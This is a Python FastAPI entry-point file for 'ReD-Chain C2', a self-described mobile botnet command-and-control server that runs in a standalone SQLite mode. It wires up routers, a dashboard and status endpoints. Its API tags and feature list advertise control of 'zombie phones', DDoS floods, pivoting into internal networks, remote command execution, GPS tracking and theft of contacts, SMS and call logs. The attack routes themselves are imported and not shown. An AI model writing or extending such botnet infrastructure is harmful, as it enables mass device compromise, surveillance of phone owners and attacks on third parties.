"""
Standalone C2 Server - Local testing version
Works without PostgreSQL/Redis dependencies
"""
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse
from contextlib import asynccontextmanager
from api.routes import nodes, tasks, pivot, remote_control, statistics, scheduler
from sqlalchemy.ext.asyncio import create_async_engine, AsyncSession, async_sessionmaker
from sqlalchemy.orm import declarative_base
import os

# SQLite for standalone mode
DATABASE_URL = "sqlite+aiosqlite:///./malchain.db"

engine = create_async_engine(
    DATABASE_URL,
    echo=False,  # Disable SQL logging for cleaner output
    future=True,
    connect_args={"check_same_thread": False}
)

AsyncSessionLocal = async_sessionmaker(
    engine,
    class_=AsyncSession,
    expire_on_commit=False
)

Base = declarative_base()


async def init_db():
    from models.node import Node
    from models.task import Task

    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)


@asynccontextmanager
async def lifespan(app: FastAPI):
    # Startup
    await init_db()
    app.state.engine = engine
    print("\n" + "="*60)
    print("  ReD-Chain C2 Server")
    print("  Mode: Standalone (SQLite)")
    print("  Database: malchain.db")
    print("  Status: Running")
    print("="*60 + "\n")
    yield
    # Shutdown


app = FastAPI(
    title="ReD-Chain C2",
    description="Mobile Botnet Command & Control Infrastructure",
    version="2.0.1",
    lifespan=lifespan,
    docs_url="/api/docs",
    redoc_url="/api/redoc",
    openapi_tags=[
        {
            "name": "nodes",
            "description": "Manage zombie phones - register, monitor status, view connected devices"
        },
        {
            "name": "tasks",
            "description": "Task distribution - create attacks, assign jobs, monitor execution"
        },
        {
            "name": "pivoting",
            "description": "Network pivoting - access internal networks through compromised phones"
        },
        {
            "name": "remote_control",
            "description": "Remote access - control phones, view screens, execute commands"
        },
        {
            "name": "statistics",
            "description": "Analytics - view botnet stats, performance metrics, activity logs"
        },
        {
            "name": "task_scheduler",
            "description": "Job scheduler - schedule recurring tasks, timed attacks, automation"
        }
    ]
)

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Routers
app.include_router(nodes.router)
app.include_router(tasks.router)
app.include_router(pivot.router)
app.include_router(remote_control.router)
app.include_router(statistics.router)
app.include_router(scheduler.router)

# Static files for web dashboard
DASHBOARD_PATH = os.path.join(os.path.dirname(__file__), "../web-dashboard/dist")
if os.path.exists(DASHBOARD_PATH):
    app.mount("/dashboard", StaticFiles(directory=DASHBOARD_PATH, html=True), name="dashboard")

    @app.get("/", tags=["status"])
    async def root():
        """Serve web dashboard"""
        index_path = os.path.join(DASHBOARD_PATH, "index.html")
        if os.path.exists(index_path):
            return FileResponse(index_path)
        return {
            "name": "ReD-Chain C2",
            "version": "2.0.1",
            "status": "online",
            "mode": "standalone",
            "db": "sqlite",
            "docs": "/api/docs",
            "dashboard": "/dashboard"
        }
else:
    @app.get("/", tags=["status"])
    async def root():
        """
        Server status and info
        """
        return {
            "name": "ReD-Chain C2",
            "version": "2.0.1",
            "status": "online",
            "mode": "standalone",
            "db": "sqlite",
            "docs": "/api/docs"
        }


@app.get("/health", tags=["status"])
async def health():
    """
    Health check endpoint
    """
    return {
        "status": "healthy",
        "db": "connected"
    }


@app.get("/api/info", tags=["status"])
async def api_info():
    """
    API capabilities and feature list
    """
    return {
        "features": {
            "node_management": "Register and monitor zombie phones",
            "task_distribution": "Distribute attack jobs across botnet",
            "port_scanning": "Distributed port scanning",
            "ddos_attacks": "HTTP flood, Slowloris, UDP flood",
            "network_pivoting": "Access internal networks via phones",
            "geolocation": "GPS tracking and location history",
            "data_collection": "Contacts, SMS, call logs, WiFi info",
            "remote_control": "Screen mirroring and remote access",
            "task_scheduling": "Scheduled and recurring tasks"
        },
        "attack_types": [
            "port_scan",
            "traffic_gen",
            "proxy_request",
            "execute_command",
            "custom"
        ],
        "node_types": ["android", "ios"],
        "endpoints": 25
    }


if __name__ == "__main__":
    import uvicorn

    uvicorn.run(
        "main_standalone:app",
        host="0.0.0.0",
        port=8000,
        reload=True,
        log_level="warning"  # Less verbose
    )
